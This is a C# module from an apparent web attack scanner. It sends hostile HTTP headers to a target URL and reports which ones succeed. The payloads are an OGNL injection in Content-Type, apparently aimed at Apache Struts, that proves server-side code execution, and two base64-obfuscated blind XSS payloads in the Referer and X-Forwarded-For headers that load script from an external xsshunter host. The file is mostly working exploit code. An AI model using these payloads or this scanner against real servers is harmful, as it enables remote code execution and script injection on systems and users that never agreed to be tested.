using Clark.Attack.Common.Interfaces;
using Clark.Attack.Common.Models;
using Clark.Attack.HTTPHeader.Models;
using Clark.Common.Models;
using Clark.Common.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Clark.Attack.HTTPHeader
{
    public class Processor : IAttack
    {
        public string Name { get { return "HTTP Header"; } set { } }

        #region Private

        private List<AttackHeader> _headers = new List<AttackHeader>()
        {
            new AttackHeader(){
                AttackHeaderCollection = new System.Net.WebHeaderCollection(){
                    {"Content-Type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack-hogarth45-POC',4*4)}.multipart/form-data" }
                },
                FingerPrintHeaders = new System.Net.WebHeaderCollection(){
                    {"X-Ack-hogarth45-POC", "16"}
                }
            },

            /////These 2 attacks like to the hogarthxlv xsshunter account
            new AttackHeader(){
                AttackHeaderCollection = new System.Net.WebHeaderCollection(){
                    {"Referer", "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaG9nYXJ0aHhsdi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>" }
                },

            },
            new AttackHeader(){
                AttackHeaderCollection = new System.Net.WebHeaderCollection(){
                    {"X-Forwarded-For", "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaG9nYXJ0aHhsdi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>" }
                },

            },
            ///////////////////  
        };

        #endregion

        public AttackResult Check(AttackRequest request)
        {
            var sResult = new AttackResult();

            WebPageRequest webRequest = new WebPageRequest(request.URL.Trim('/'));
            webRequest.Log = true;
            webRequest.LogDir = request.LogDir;

            foreach (var attack in _headers)
            {
                webRequest.Headers = attack.AttackHeaderCollection;
                WebPageLoader.Load(webRequest);

                foreach (var headerFP in attack.FingerPrintHeaders.AllKeys)
                {
                    var header = webRequest.Response.Headers.Get(headerFP);
                    if (header != null)
                    {
                        if (attack.FingerPrintHeaders[headerFP] == webRequest.Response.Headers[headerFP])
                        {
                            sResult.Success = true;
                            sResult.Results.Enqueue("URL: " + request.URL + " ::: Header=" + headerFP);
                        }
                    }
                }
            }

            return sResult;
        }
    }
}